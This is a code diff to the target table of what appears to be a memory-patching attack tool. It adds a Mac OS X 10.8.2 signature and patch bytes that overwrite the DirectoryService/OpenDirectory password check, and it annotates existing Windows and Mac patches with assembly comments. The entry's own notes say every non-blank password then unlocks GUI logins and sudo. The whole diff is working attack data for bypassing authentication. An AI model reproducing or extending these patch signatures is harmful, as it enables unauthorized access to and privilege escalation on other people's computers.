@@ -142,7 +142,7 @@ targets=[{'OS': 'Windows 8',
           'signatures': [{'offsets': [0xde7], # x86 SP0 
                           'chunks': [{'chunk': 0x8bff558bec81ec90000000a1,
                                       'internaloffset': 0x00,
-                                      'patch': 0xb001,
+                                      'patch': 0xb001, # mov al,1
                                       'patchoffset': 0xc1}]},
                          {'offsets': [0x208], # x64 SP0
                           'chunks': [{'chunk': 0xc60f85,
@@ -201,7 +201,7 @@ targets=[{'OS': 'Windows 8',
                                       'patch': 0x83f8109090b0018b,
                                       'patchoffset': 0x00}]}]},
          {'OS': 'Mac OS X',
-          'versions': ['10.6.4', '10.6.8', '10.7.3'],
+          'versions': ['10.6.4', '10.6.8', '10.7.3', '10.8.2'],
           'architectures': ['x32', 'x64'],
           'name': 'DirectoryService/OpenDirectory unlock/privilege escalation',
           'notes': 'Overwrites DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank passwords',
@@ -223,10 +223,15 @@ targets=[{'OS': 'Windows 8',
                          {'offsets': [0xfa7], # 10.7.3 x64
                           'chunks': [{'chunk': 0x0fb6,
                                       'internaloffset': 0x00,
-                                      'patch': 0x31dbffc3, #xor ebx, ebx; inc ebx;
+                                      'patch': 0x31dbffc3, # xor ebx, ebx; inc ebx;
                                       'patchoffset': 0x00},
                                      {'chunk': 0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
-                                      'internaloffset': 0x0e}]}]},
+                                      'internaloffset': 0x0e}]},
+                         {'offsets': [0x334], # 10.8.2 x64
+                          'chunks': [{'chunk': 0x88d84883c4685b415c415d415e415f5d,
+                                      'internaloffset': 0x00,
+                                      'patch': 0xb001, # mov al,1;
+                                      'patchoffset': 0x00}]}]},
          {'OS': 'Ubuntu',
           'versions': ['11.04','11.10','12.04'],
           'architectures': ['x32', 'x64'],
